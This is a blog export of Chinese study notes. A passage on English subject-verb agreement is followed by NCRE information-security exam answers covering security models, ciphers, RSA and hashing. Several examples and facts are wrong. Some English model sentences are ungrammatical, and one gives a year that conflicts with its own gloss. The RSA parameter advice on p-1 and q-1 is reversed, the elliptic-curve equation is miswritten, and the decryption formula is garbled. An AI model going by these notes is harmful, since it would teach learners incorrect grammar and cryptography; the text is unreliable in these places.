<li><p>国家、机构、书名等专有名词的复数形式看作整体，谓语用单数</p>
<p><code>The United States was founded in 1775</code> (美国建立与1776年)</p>
<p><code>&quot;Three Kingdoms&quot; is a good story</code> (三国演义是一个好故事)</p>
</li>
<li><p><code>many a ...</code> 或 <code>more than one</code> <strong>+</strong> 名词做主语，谓语用单数</p>
<p><code>Many a man is smoking</code> (很多男人在吸烟)</p>
<p><code>More than one man is smoking</code> (不止一个男人在吸烟)</p>
</li>
<li><p><code>one and a half</code> <strong>+</strong> 复数名词做主语，谓语用单数</p>
<p><code>One and a half watermelons is in the fridge</code> (冰箱里有一个半西瓜)</p>
</li>
<li><p>时间、钱、距离、等各种单位看做整体，谓语用单数</p>
<p><code>Two dollars is no big deal</code> (两美元没什么大不了)</p>
<p><code>Four miles isnot along way</code> (四英里的路不远)</p>
</li>
<li><p>加减乘除运算中，谓语用单数</p>
<p><code>Five times five is twenty-five</code> (5乘5是25)</p>
<p><code>one plus one is two</code> (1加1是2)</p>
</li>
<li><p><code>each</code>、<code>one</code>、<code>no one</code>、<code>some(any,no,every)</code> <strong>+</strong> <code>body(one,thing)</code> 作主语或作限定词(限定在一个范围内了)，谓语用单数</p>
<p><code>Each student is in the classroom</code> (每个学生都在教室里)</p>
<p><code>someone student is in the classroom</code> (某个学生在教室里)</p>
</li>
<li><p><code>one</code> <strong>+</strong> of <strong>+</strong> 复数名词结构中，谓语用单数</p>
<p><code>One of the students in our school is from the United States</code> (我们学校有一名来自美国的学生)</p>
</li>
<li><p>含有集体概念的名词，根据上下问判断，整体概念谓语用单数，个体概念谓语用复数</p>
<p><code>The fmaily was in a poor way</code>(这是一个家庭生活)</p>
<p><code>The family goes to the movies together</code> (这家人一起去看电影(个体概念，这一家的人))</p>
</li>
</ul>
<ul>
<li><p>连词相关</p>
<ul>
<li><code>and</code> 或 <code>both...and...</code> 连接两个单数名词做主语，代表复数的概念，大多数情况谓语用复数</li>
</ul>
<p><code>He and him families are at the funeral</code> (他和他的家人在参加葬礼)</p>
<p><code>Bath China ad the United States are big countries</code> (中国和美国都是大国)</p>
<ul>
<li><code>adn</code> 连接两个单数词，指同一人同一物或同一概念，两个名词共用一个冠词，谓语动词用单数</li>
</ul>
<p><code>The YouTuber and traveler is he friend</code> (这位旅行家兼YouTube视频博主是他的朋友)</p>
<ul>
<li><code>and</code> 连接两个单数词，主语前有 <code>every</code>、<code>each</code>、<code>no</code>、<code>many a</code> 修饰时，谓语用单数</li>
</ul>
<p><code>Each day and night is busy</code> (每天都从早忙到晚)</p>
</li>
<li><p>不定冠词<code>a/an</code> <strong>+</strong> 单数名词 <strong>+</strong> or two做主语，谓语用单数</p>
<p><code>An apple or two is not enough</code> (一两个苹果是不够的)</p>
</li>
<li><p><code>one or two</code> <strong>+</strong> 复数名词做主语，谓语用复数</p>
<p><code>One or two apples are not enough</code> (一两个苹果是不够的)</p>
</li>
</ul>
<ul>
<li><p><code>some of</code>、<code>plenty of</code>、<code>a lot of</code>、<code>lots of</code>、<code>most of</code>、<code>the rest of</code>、<code>all of</code>、<code>half of</code>、<code>part of</code>、分数/百分百 + of + 名词短语，作主语；谓语动词与<code>of</code>后的名词，保持单复数一致</p>
<p><code>Most of the student was gone</code> (大多数学生都走了)</p>
<p><code>Most of the students were gone</code> (大多数学生都走了)</p>
</li>
<li><p><code>few</code>、<code>many</code>、<code>several</code>、<code>all</code>、<code>some</code>后加名词做主语，谓语用复数</p>
<p><code>The few words are difficult</code> (这几句话好难)</p>
</li>
<li><p>就近原则 (距离谓语近的名词，决定谓语单复数)</p>
<ul>
<li>There be/Here be</li>
</ul>
<p><code>There is one computer and two phones</code> (那有一台电脑和两台手机)</p>
<p><code>There are two computers and one phone</code> (那有两台电脑和一台手机)</p>
<p><code>Here is one apple and two bananas</code> (那有一个苹果和两个香蕉)</p>
<p><code>Here are two apples and one banana</code> (那有两个苹果和一个香蕉)</p>
<ul>
<li>or、either…or…(二选一)、neither…nor…(两个都不选，选另外一个)、not only…but…(also)(不经而且，两者都)连接并列作主语</li>
</ul>
<p><code>His friends or he was dead</code> (他的朋友们或者他已经死了)</p>
<p><code>He or his friends were dead</code> (他或者他的朋友们已经死了)</p>
<p><code>Either my brothers or mother is goning to the garden</code> (我弟弟或者妈妈要去花园)</p>
<p><code>Either mother or my brothers are going to the garden</code> (妈妈或者我弟弟要去花园)</p>
<p><code>Neither two apples nor one banana is vegetable</code> (两苹果和一个香蕉都不是蔬菜)</p>
<p><code>Neither one apple nor two bananas are vegetables</code> (一个苹果和两个香蕉都不是蔬菜)</p>
<p><code>Not only my friends but also my girlfriend was wrong</code> (不仅是我朋友，我女朋友也错了)</p>
<p><code>Not only my girlfriend but also my friends were wrong</code> (不仅是我女朋友，我朋友也错了)</p>
<ul>
<li>四除(<code>but</code>、<code>except</code>、<code>besides</code>、<code>in addition to</code>) 五和 (<code>with</code>、<code>along with</code>、<code>together with</code>、<code>combined with</code>、<code>as well as</code>) 包括(<code>including</code>) 而不是(<code>rather than</code>、<code>instead of</code>)</li>
</ul>
<p><code>Peter,but his roommates,is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,except his roommates,is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,besides his roommates.is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,in addition to his roommates,is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,along with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,together with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,combined with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,as well as his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,including his roommates,is friendly.</code> (皮特人很好，包括他室友也很好)</p>
<p><code>Peter,rather than his roommates,is friendly.</code> (皮特人很好而不是他室友)</p>
<p><code>Peter,instead of his roommatesmis friendly.</code> (皮特人很好而不是他室友)</p>
</li>
</ul>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机等级考试三级信息安全技术章节习题1</title>
    <url>/posts/36c9221f/</url>
    <content><![CDATA[<p><strong>一、信息安全保障概述</strong></p>
<h1 id="什么是信息？试比较分析书中有关信息的各种定义"><a href="#什么是信息？试比较分析书中有关信息的各种定义" class="headerlink" title="什么是信息？试比较分析书中有关信息的各种定义"></a>什么是信息？试比较分析书中有关信息的各种定义</h1><ul>
<li>钟义信定义信息为事物运动的状态和状态变化的方式（具有最大的普遍性）</li>
<li>香农认为信息是用来减少不确定性的东西</li>
<li>维纳认为信息是在人们适应外部世界且这种适应反作用于外部世界的过程中，同外部世界进行相互交换的内容的名称</li>
</ul>
<p>消息是信息的外壳，信息是消息的内核；消息是信息的笼统概念，信息是消息的精确概念<br>信号是信息的载体<br>数据是记录信息的一种形式<br>情报是指秘密的、专门的一类信息<br>知识是从信息中抽象出的产物</p>
<a id="more"></a>
<h1 id="简单描述信息技术发展的各个阶段"><a href="#简单描述信息技术发展的各个阶段" class="headerlink" title="简单描述信息技术发展的各个阶段"></a>简单描述信息技术发展的各个阶段</h1><ul>
<li>电讯技术的发明</li>
<li>计算机技术的发展</li>
<li>互联网技术的发展</li>
</ul>
<h1 id="信息技术对社会和个人有哪些影响？"><a href="#信息技术对社会和个人有哪些影响？" class="headerlink" title="信息技术对社会和个人有哪些影响？"></a>信息技术对社会和个人有哪些影响？</h1><p>信息技术已成为科学技术前沿</p>
<ul>
<li>加速了社会生产力的发展和人们生活质量的提高</li>
<li>促进了新技术的革新</li>
<li>促进了新兴学科和交叉学科的产生和发展</li>
<li>促进了人们的工作效率和生活质量的提高，以及工作方式和学习方式的改变，使得人们学习方式更灵活，内容更丰富</li>
</ul>
<h1 id="试说明信息安全发展的各个阶段"><a href="#试说明信息安全发展的各个阶段" class="headerlink" title="试说明信息安全发展的各个阶段"></a>试说明信息安全发展的各个阶段</h1><ul>
<li>通信保密阶段（20世纪40年代）：人们关注信息在通信过程中的安全性问题，即机密性，密码学死确保机密性的核心技术</li>
<li>计算机安全阶段（20世纪60-70年代）：计算机安全概念逐步得到推行，多用户操作系统出现，人们对信息安全的关注扩到机密性、访问控制与认证</li>
<li>信息安全保障阶段（20世纪90年代以后）</li>
</ul>
<h1 id="信息安全保障的含义是什么？"><a href="#信息安全保障的含义是什么？" class="headerlink" title="信息安全保障的含义是什么？"></a>信息安全保障的含义是什么？</h1><p>信息安全保障强调保护、检测、反应和恢复4种能力，围绕人员、技术和管理这3个层次，以支持机构的任务好职能为目标， 注重体系建设，强化组织与协调功能。</p>
<p>预警（Warning） → 保护 → 监测 → 应急 → 恢复 → 反击（Counter-Attack） WPDRRC模型，使信息安全保障技术体系立于更加坚实的基础上</p>
<h1 id="信息安全的基本属性有哪些？"><a href="#信息安全的基本属性有哪些？" class="headerlink" title="信息安全的基本属性有哪些？"></a>信息安全的基本属性有哪些？</h1><ul>
<li>完整性</li>
<li>机密性</li>
<li>可用性</li>
<li>可控制性</li>
<li>可用性</li>
<li>不可否认性</li>
</ul>
<h1 id="信息安全问题产生的根源是什么？"><a href="#信息安全问题产生的根源是什么？" class="headerlink" title="信息安全问题产生的根源是什么？"></a>信息安全问题产生的根源是什么？</h1><ul>
<li>信息安全内因：信息系统的复杂性<ul>
<li>组成网络的通信和信息系统的自身缺陷，随着系统功能越来越强大，系统的复杂性不断增加，漏洞也就越多</li>
<li>互联网的开放性，网络协议体系和实现是开放的，互联网缺少足够安全的设计，因此其中的漏洞会被熟悉协议的人利用</li>
</ul>
</li>
<li>信息安全内因：人为和环境的威胁<ul>
<li>人为原因</li>
<li>自然环境的原因</li>
</ul>
</li>
</ul>
<h1 id="简述信息安全的地位和作用"><a href="#简述信息安全的地位和作用" class="headerlink" title="简述信息安全的地位和作用"></a>简述信息安全的地位和作用</h1><p>信息安全具有头等重要的地位，是一切安全的重中之重</p>
<ul>
<li>是网络时代国家生存和名族振兴的根本保障</li>
</ul>
<p>21世纪经济安全、国家安全和名族振兴的首要条件，没有信息安全的保障，国家安全就无从谈起</p>
<ul>
<li>是信息社会健康发展和信息革命成功的关键因素</li>
<li>是网络时代人类生存和文明发展的基本条件</li>
</ul>
<p>信息安全已经不仅仅是某个国家、某个政府的事情，它日益成为人类整体的安全，成为人类文明的安全</p>
<h1 id="试着阐述信息安全保障框架体系"><a href="#试着阐述信息安全保障框架体系" class="headerlink" title="试着阐述信息安全保障框架体系"></a>试着阐述信息安全保障框架体系</h1><p>指信息系统的整个生命周期中，通过分析信息系统的风险，制定并执行相应的安全保障策略，从技术、管理、工程和人员等方面提出安全保障要求，确保信息系统的机密性、完整性和可用性，降低安全风险到可接受的程度，保障信息系统能够实现组织机构的使命。</p>
<p>信息安全保障体系涵盖3个方面：</p>
<ul>
<li>生命周期<ul>
<li>规划组织</li>
<li>开发采购</li>
<li>实施交付</li>
<li>运行维护</li>
<li>废弃</li>
</ul>
</li>
<li>保障要素<ul>
<li>安全技术</li>
<li>安全管理</li>
<li>安全工程</li>
<li>人员安全</li>
</ul>
</li>
<li>安全特征<ul>
<li>保密性</li>
<li>完整性</li>
<li>可用性</li>
</ul>
</li>
</ul>
<h1 id="简述-P2DR-模型并用公式表示之"><a href="#简述-P2DR-模型并用公式表示之" class="headerlink" title="简述 P2DR 模型并用公式表示之"></a>简述 P2DR 模型并用公式表示之</h1><p>动态网络安全体系的代表模型，也是动态安全模型的雏形，包括4个主要部分：策略（Policy）、防护（Protection）、检测（Detection）和响应（Response）</p>
<p>策略是模型的核心</p>
<p>$P_t&gt;D_t+R_t$</p>
<p>$P_t$ : 为了保护安全目标设置各种保护后时间，防护时间</p>
<p>$D_t$ : 入侵开始到检测到入侵行为所花费的时间，检测时间</p>
<p>$R_t$ : 发现入侵行为到能够做出足够的响应将系统调整到正常状态的时间，响应时间</p>
<p>防护时间大于检测时间加上响应时间，则入侵者危害安全目标之前就能检测到并及处理</p>
<p>$E_t=D_t+R_t(P_t=0)$</p>
<p>$P_t$ : 防护时间，$D_t$ : 检测时间，$R_t$ : 响应时间，$E_t$ : 暴露时间，越小系统越安全</p>
<h1 id="IATF-的核心思想是什么？描述纵深防御战略的主要内容"><a href="#IATF-的核心思想是什么？描述纵深防御战略的主要内容" class="headerlink" title="IATF 的核心思想是什么？描述纵深防御战略的主要内容"></a>IATF 的核心思想是什么？描述纵深防御战略的主要内容</h1><p>IATF （Information Assurance Technical Framework，信息保障技术框架），核心思想是纵深防御战略，采用多层次、纵深的安全措施来保障用户信息及信息系统的 安全，人员、技术和操作是核心因素，要保障信息及信息系统的安全，三者缺一不可</p>
<p>IATF 的3个主要核心要素： <strong>人员、技术、操作</strong></p>
<p>使能够攻破一层或一类保护的攻击行为无法破坏整个信息基础设施，通过各个层次、各个技术框架领域中实施保障机制，才能最大限度地降低风险，防止攻击，保护信息系统的安全，技术是安全的基础，管理是安全的灵魂</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">人员</th>
<th style="text-align:left">技术</th>
<th style="text-align:left">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">培训<br>安全意识教育<br>物理安全<br>场所安全<br>人员安全<br>系统安全管理</td>
<td style="text-align:left">纵深防御技术框架域<br>信息保障要素<br>安全标准<br>风险分析（技术评估）<br>证书与信任</td>
<td style="text-align:left">安全策略<br>认证与委派<br>安全管理<br>证书、密钥、密码管理<br>风险分析（合规性检查）<br>应急响应（分析、监控、告警、恢复）</td>
</tr>
</tbody>
</table>
</div>
<h1 id="IATF-的-4-个技术框架和焦点域分别是什么？"><a href="#IATF-的-4-个技术框架和焦点域分别是什么？" class="headerlink" title="IATF 的 4 个技术框架和焦点域分别是什么？"></a>IATF 的 4 个技术框架和焦点域分别是什么？</h1><ul>
<li>保护本地计算环境</li>
<li>保护区域边界</li>
<li>保护网络及基础设施</li>
<li>保护支撑性基础设施</li>
</ul>
<h1 id="信息安全保障工作基本内容有哪些？"><a href="#信息安全保障工作基本内容有哪些？" class="headerlink" title="信息安全保障工作基本内容有哪些？"></a>信息安全保障工作基本内容有哪些？</h1><p>保证国民经济基础设施的信息安全，抵御有关国家、地区、集团可能对我实施的信息战的威胁，打击国内外的高技术犯罪，保障国家安全、社会稳定和经济发展。信息安全战略防御的重点任务是：保障国民经济中的国家经济基础设施，包括金融、银行、税收、能源生产储备、粮油生产储备、水电气供应、交通运输、邮电通信、广播电视、商业贸易等的安全</p>
<h1 id="简述信息安全测评的流程"><a href="#简述信息安全测评的流程" class="headerlink" title="简述信息安全测评的流程"></a>简述信息安全测评的流程</h1><p>信息安全风险评估通常采用的方式：配置检查、工具测试、专家访谈、资料审阅、专家评议</p>
<p>信息安全风险评估流程：</p>
<ul>
<li>受理申请<ul>
<li>委托单位提出申请，测评机构按商务流程受理</li>
<li>委托单位按《测评文档准备指南》提交质料</li>
</ul>
</li>
<li>静态评估<ul>
<li>测评机构组织项目组审核提交的文档</li>
<li>通过审核</li>
<li>未通过审核，指导委托单位修改完善相关材料 <code>→</code> 测评机构组织项目组审核提交的文档</li>
<li>测评机构制定评估方案及计划、准备评估工具，协调有关工作</li>
</ul>
</li>
<li>现场评估<ul>
<li>按照评估计划实施现场评估</li>
</ul>
</li>
<li>风险分析<ul>
<li>根据现场评测结果对风险分析，制定风险列表</li>
<li>与委托单位共同确定可接受风险范围，提出风险处置建议</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">op1&#x3D;&gt;operation: 委托单位提出申请，测评机构按商务流程受理</span><br><span class="line">op2&#x3D;&gt;operation: 委托单位按《测评文档准备指南》提交质料</span><br><span class="line">op3&#x3D;&gt;operation: 测评机构组织项目组审核提交的文档</span><br><span class="line">op4&#x3D;&gt;operation: 指导委托单位修改完善相关材料</span><br><span class="line">op5&#x3D;&gt;operation: 测评机构制定评估方案及计划、准备评估工具，协调有关工作</span><br><span class="line">op6&#x3D;&gt;operation: 按照评估计划实施现场评估</span><br><span class="line">op7&#x3D;&gt;operation: 根据现场评测结果对风险分析，制定风险列表</span><br><span class="line">op8&#x3D;&gt;operation: 与委托单位共同确定可接受风险范围，提出风险处置建议</span><br><span class="line">cond&#x3D;&gt;condition: 通过审核</span><br><span class="line"></span><br><span class="line">op1-&gt;op2-&gt;op3-&gt;cond(yes)-&gt;op5-&gt;op6-&gt;op7-&gt;op8</span><br><span class="line">cond(no)-&gt;op4-&gt;op3</span><br></pre></td></tr></table></figure>
<h1 id="简述信息监控的流程"><a href="#简述信息监控的流程" class="headerlink" title="简述信息监控的流程"></a>简述信息监控的流程</h1><p>信息安全监控流程：</p>
<ul>
<li>受理申请<ul>
<li>委托单位提出申请，测评机构按商务流程受理</li>
<li>委托单位按《测评文档准备指南》提交质料</li>
</ul>
</li>
<li>非现场准备<ul>
<li>测评机构组织项目组审核提交的文档</li>
<li>通过审核</li>
<li>未通过审核，指导委托单位修改完善相关材料 <code>→</code> 测评机构组织项目组审核提交的文档</li>
<li>测评机构制定监控工作方案，准备监控工具和模板</li>
</ul>
</li>
<li>现场准备<ul>
<li>搭建监控工作环境，了解监控对象的管理方式</li>
</ul>
</li>
<li>现场监控<ul>
<li>采集监控数据</li>
<li>分析监控数据</li>
<li>是否有安全事件有继续，无 <code>→</code> 采集监控数据</li>
<li>安全事件预警</li>
</ul>
</li>
<li>综合分析<ul>
<li>安全姿态分析</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">op1&#x3D;&gt;operation: 委托单位提出申请，测评机构按商务流程受理</span><br><span class="line">op2&#x3D;&gt;operation: 委托单位按《测评文档准备指南》提交质料</span><br><span class="line">op3&#x3D;&gt;operation: 测评机构组织项目组审核提交的文档</span><br><span class="line">op4&#x3D;&gt;operation: 指导委托单位修改完善相关材料</span><br><span class="line">op5&#x3D;&gt;operation: 测评机构制定监控工作方案，准备监控工具和模板</span><br><span class="line">op6&#x3D;&gt;operation: 搭建监控工作环境，了解监控对象的管理方式</span><br><span class="line">op7&#x3D;&gt;operation: 采集监控数据</span><br><span class="line">op8&#x3D;&gt;operation: 分析监控数据</span><br><span class="line">op9&#x3D;&gt;operation: 安全事件预警</span><br><span class="line">op10&#x3D;&gt;operation: 安全姿态分析</span><br><span class="line">cond1&#x3D;&gt;condition: 通过审核</span><br><span class="line">cond2&#x3D;&gt;condition: 是否有安全事件</span><br><span class="line"></span><br><span class="line">op1-&gt;op2-&gt;op3-&gt;cond1(yes)-&gt;op5-&gt;op6-&gt;op7-&gt;op8-&gt;cond2(yes)-&gt;op9-&gt;op10</span><br><span class="line">cond1(no)-&gt;op4-&gt;op3</span><br><span class="line">cond2(no)-&gt;op7</span><br></pre></td></tr></table></figure>
<h1 id="我国信息安全方面的主要法律法规有哪些？"><a href="#我国信息安全方面的主要法律法规有哪些？" class="headerlink" title="我国信息安全方面的主要法律法规有哪些？"></a>我国信息安全方面的主要法律法规有哪些？</h1><ul>
<li>《中华人民共和国计算机安全保护条例》</li>
<li>《中华人民共和国商业密码管理条例》</li>
<li>《中华人民共和国计算机信息网络国际管理暂行办法》</li>
<li>《关于对国际互联网的计算机信息系统进行备案工作的通知》</li>
<li>《计算机信息国际互联网安全保护管理办法》</li>
<li>《中华人民共和国电子签名法》(2004.8.28发布，2005.4.1实施)</li>
<li>《中华人们共和国网络安全法》(2016.11.7发布，2017.6.1实施)</li>
</ul>
<h1 id="简述常用的信息安全技术"><a href="#简述常用的信息安全技术" class="headerlink" title="简述常用的信息安全技术"></a>简述常用的信息安全技术</h1><ul>
<li>密码技术</li>
<li>标识与认证技术</li>
<li>授权与访问控制技术</li>
<li>网络与系统攻击技术</li>
<li>网络与系统安全防护与应急响应技术</li>
<li>安全审计与责任认定技术</li>
<li>主机系统安全技术</li>
<li>网络系统安全技术</li>
<li>恶意代码检测与防范技术</li>
<li>信息安全测评技术</li>
<li>安全管理技术</li>
</ul>
]]></content>
      <categories>
        <category>NCRE</category>
      </categories>
      <tags>
        <tag>NCRE</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机等级考试三级信息安全技术章节习题2</title>
    <url>/posts/afc073a5/</url>
    <content><![CDATA[<p><strong>二、信息安全技术与原理</strong></p>
<h1 id="简述密码体制的构成"><a href="#简述密码体制的构成" class="headerlink" title="简述密码体制的构成"></a>简述密码体制的构成</h1><ul>
<li>消息空间：明文 <code>m</code> ，明文空间 <code>M</code></li>
<li>密文空间：密文 <code>c</code> ，密文空间 <code>C</code></li>
<li>密钥空间： 密钥 <code>k</code> ，密钥空间 <code>K</code></li>
<li>加密算法 <code>E</code> ，$c=E_k(m)$ 或 $c=E(m,k)$</li>
<li>解密算法 <code>D</code> ，$m=D_k(c)$ 或 $m=D(c,k)$</li>
</ul>
<p>加密密钥通常表示为 $k_e$ ，解密密钥通常表示为 $k_d$ :</p>
<script type="math/tex; mode=display">m=D_{k_d}(E_{k_d}(m))</script><a id="more"></a>
<h1 id="简述分组密码与序列密码的区别"><a href="#简述分组密码与序列密码的区别" class="headerlink" title="简述分组密码与序列密码的区别"></a>简述分组密码与序列密码的区别</h1><p>对称密码体制根据明文加密方式分为分组密码和序列密码两种</p>
<ul>
<li>分组密码（分块密码），将明文消息编码表示后的位或字符序列，按指定的分组长度划分为多个分组，每个分组在密钥控制下变换成等长的输出，如果编码长度不是分组长度的整数倍，需对明文进行填充。常见分组密码: <strong>DES 、IDES 、AES</strong></li>
<li>序列密码（流密码），将明文和密钥或分为位或字符序列，对明文序列中每一位或字符都用密钥序列中的对应分量来加密。常见序列密码：<strong>RC4 、SEAL 、ZUC 、ChaCha20 、Trivium</strong></li>
</ul>
<p>分组密码每一次加密一个明文组，而序列密码每一次加密一位或一个字符</p>
<h1 id="简述对称密码和非对称密码体制的区别"><a href="#简述对称密码和非对称密码体制的区别" class="headerlink" title="简述对称密码和非对称密码体制的区别"></a>简述对称密码和非对称密码体制的区别</h1><ul>
<li>对称密码体制（单密钥密码体制），发送方与接收方共享相同的密钥（<strong>加密密钥与解密密钥相同</strong>），密钥管理困难，通信双方必须先预约相同的密钥后才能进行加密，任何对称加密算法的设计，混淆及扩散是两个重要的安全特性</li>
<li>非对称密码体制（公开密钥密码体制，公钥密码体制），使用加密密钥 $K_e$ 控制加密，使用解密密钥 $K_d$ 控制解密，由计算复杂性确保通过加密密钥 $K_e$ 计算不能推出解密密钥 $K_d$ 。样公开 $K_e$ 也不会暴露 $K_d$ ，也不会损害密码的安全。公开了加密密钥，对解密密钥进行保密，从根本上客服了传统密码在密钥分配上的困难 </li>
</ul>
<h1 id="简述分组密码的工作模式"><a href="#简述分组密码的工作模式" class="headerlink" title="简述分组密码的工作模式"></a>简述分组密码的工作模式</h1><p>分组密码的工作模式是一种算法，刻画了如何利用分组密码提供安全服务，主要有5种工作模式</p>
<ul>
<li>电子密码本模式：利用分组密码对明文的各分组进行加密</li>
<li>密码分组链模式：明文要与前面的密文进行异或运算然后被加密，形成密文链</li>
<li>密码反馈模式</li>
<li>输出反馈模式</li>
<li>计数模式</li>
</ul>
<h1 id="什么是乘积密码，它的主要作用是什么？简述-DES-和-AES-所使用的两类乘积密码"><a href="#什么是乘积密码，它的主要作用是什么？简述-DES-和-AES-所使用的两类乘积密码" class="headerlink" title="什么是乘积密码，它的主要作用是什么？简述 DES 和 AES 所使用的两类乘积密码"></a>什么是乘积密码，它的主要作用是什么？简述 DES 和 AES 所使用的两类乘积密码</h1><p>乘积密码是采用 <code>m</code> 个函数 $f_1,f_2,···,f_m$ 复合，其中每个 $f_i$ 可能是一个代换或置换，代换和置换称为混淆和扩散的过程，破坏对称密码系统进行的各种统计分析 ，常见的乘积密码是迭代密码</p>
<ul>
<li>数据加密标准（DES）算法：分组大小64位，加密或解密密钥也为64位。有8位用来奇偶校验，真正起密钥作用的只有56位，除了子密钥的顺序不同外，其他部分完全相同 </li>
<li>高级加密标准（AES）算法：分组长度固定为128位，密钥可为128、192或256位，在整体上采用SP网络组成圈函数，多圈迭代，S为混淆层起混淆作用，P为扩散层起扩散作用</li>
</ul>
<h1 id="简述-AES-、-IDEA-两类典型对称密码加密算法的工作原理，简述-RSA-算法的原理以及参数选择，简述-ECC-所依赖的数学难题"><a href="#简述-AES-、-IDEA-两类典型对称密码加密算法的工作原理，简述-RSA-算法的原理以及参数选择，简述-ECC-所依赖的数学难题" class="headerlink" title="简述 AES 、 IDEA 两类典型对称密码加密算法的工作原理，简述 RSA 算法的原理以及参数选择，简述 ECC 所依赖的数学难题"></a>简述 AES 、 IDEA 两类典型对称密码加密算法的工作原理，简述 RSA 算法的原理以及参数选择，简述 ECC 所依赖的数学难题</h1><ul>
<li>AES：AES算法处理的数据块被分成一个字符矩阵，每次加密操作都是在字节级上定义的。明文 <code>m</code> 执行初始的密钥加变换，将得到的输出作为迭代运输的输入，之后执行指定次数的迭代运输，每次迭代都将运行圈函数<code>F</code> ，圈函数 <code>F</code> 分为4层，第一层是 S 盒变换 ByteSub 是AES算法唯一的非线性变换起混淆作用，第二层行移位变换 ShiftRow ，第四层列混淆变换 MitColumn 是线性混合层矩阵行被位移，列被混叠，确保多伦之上的高度扩散，第四层为圈密钥加变换 AddRoundKey ，矩阵中的每个字节都将与子密钥进行异或</li>
<li>IDEA：利用128位的密钥对64位的明文分组，经过连续加密产生64位的密文分组。使用3种函数混合组合来打乱数据，无法用化简的方式来分析密文与明文及密钥之间的关系，3个函数中任意两个函数都无法满足结合律和分配律</li>
<li><p>RSA ： 基于一个十分简单的数论事实，将两个大素数相乘十分容易，但想要对乘积进行因式分解极其困难，因此可以将乘积公开作为加密密钥</p>
<ul>
<li><p>随机两个大素数 <code>p</code> 和 <code>q</code> 。 <code>p</code>,  <code>q</code> 保密</p>
</li>
<li><p>计算 $n=pq$  。 <code>n</code> 公开</p>
</li>
<li><p>计算 $φ(n)=(p-1)(q-1)$ 。 $φ(n)$ 保密</p>
</li>
<li><p>随机正整数 $e$ , $1&lt;e&lt;φ(n)$ 且 $e$ 与 $φ(n)$ 互素，<code>e</code> 和 <code>n</code> 构成用户的公钥</p>
</li>
<li><p>$ed≡1\ mod\ φ(n)$ 计算出 <code>d</code> ，<code>d</code> 保密 , <code>d</code>  和<code>n</code> 构成用户私钥</p>
</li>
<li><p>加密：$C=M^e\ mod\ n$</p>
</li>
<li><p>解密：$M=C^d\ mod\ n$</p>
<p>$φ(n)$ 称为<a href>欧拉函数</a></p>
<p>RSA加解密运算具有可交换性： $D(E(m))=(M^e)^d=M^{ed}=(M^d)^e=E(D(m))\ mod\ n$</p>
<p>RSA密码的 <code>n</code> 至少取 1024 位，最好2048位，安全性要求较高的要达4096位</p>
<p>为了确保RSA密码的安全，参数的选择需要：</p>
<ul>
<li><code>p</code> 和 <code>q</code> 要足够大，才能确保 $n=pq$ 足够大，以对抗因式分解攻击</li>
<li><code>p</code> 和 <code>q</code> 要为强素数</li>
<li><code>p</code> 和 <code>q</code> 的差要大 ，及 $|p-q|$ 要大</li>
<li>$p-1$ 和 $q-1$ 应有大的公因子</li>
<li><code>e</code> : 为了使加密速度快，<code>e</code> 的二进制中应含尽量少的 <code>1</code> ，有学者建议 $e=65537$ 其二进制表示中只有两个 <code>1</code> ，比 <code>2</code> 安全且加密速度快</li>
<li><code>d</code> : 为了使加密速度快，选用小的 <code>d</code> ，但太小也不行，当 <code>d</code> 小于 <code>n</code> 的 <code>1/4</code> 时，已有求出 <code>d</code> 的攻击方法</li>
<li>不要许多用户共用一个模数 <code>n</code></li>
</ul>
</li>
</ul>
</li>
<li><p>ECC（椭圆曲线密码），椭圆曲线方程 $y^3=x^3+ax+b(mod\ p)$  <code>p</code> 为一个素数或 <code>2</code> 的幂（有时称椭圆曲线的秩(zhì)）且 $4a^3+27b^2≠0$，依赖椭圆曲线上的离散对数问题设计该密码</p>
</li>
</ul>
<h1 id="设通信双方使用-RSA-加密体制，接收方的公开钥是-e-n-5-35-，接收到的密文是-c-10-，求明文-m"><a href="#设通信双方使用-RSA-加密体制，接收方的公开钥是-e-n-5-35-，接收到的密文是-c-10-，求明文-m" class="headerlink" title="设通信双方使用 RSA 加密体制，接收方的公开钥是 $(e,n)\ =\ (5,35)$ ，接收到的密文是 $c\ =\ 10$ ，求明文 $m$"></a>设通信双方使用 RSA 加密体制，接收方的公开钥是 $(e,n)\ =\ (5,35)$ ，接收到的密文是 $c\ =\ 10$ ，求明文 $m$</h1><p>$ n=pq\ ;\ \phi (n)=(p-1)(q-1)\ ;\ ed \equiv1\ mod\ \phi (n)\ $</p>
<p>$ c=m \wedge e\ mod\ n\ ;\ m=c\wedge d\ mod\ n $</p>
<p>$ ed \equiv 1\ mod\ \phi (n)\ \to\ ed\ mod\ \phi (n)=1 $</p>
<p>$ n=5 \times 7\ ;\ \phi (n)=4 \times 6=24 $</p>
<p>$ 5 \times d \equiv 1\ mod\ 24 $</p>
<p>$ d = 5 $</p>
<p>$ m = 10 \wedge 5\ mod\ 35 $</p>
<p>$ m = 5 $</p>
<h1 id="什么是哈希函数？对哈希函数的基本要求和安全性分别是什么？"><a href="#什么是哈希函数？对哈希函数的基本要求和安全性分别是什么？" class="headerlink" title="什么是哈希函数？对哈希函数的基本要求和安全性分别是什么？"></a>什么是哈希函数？对哈希函数的基本要求和安全性分别是什么？</h1><p>哈希函数又叫散列函数、紧凑函数，只有加密过程没有解密过程，要求任意长度输入经过变换后得到固定长度的输出，也称为原消息的散列或消息摘要，理想的哈希函数对于不同的输入可以获得不同的哈希值。</p>
<p>哈希函数特点：</p>
<ul>
<li>压缩</li>
<li>易计算</li>
<li>单向性</li>
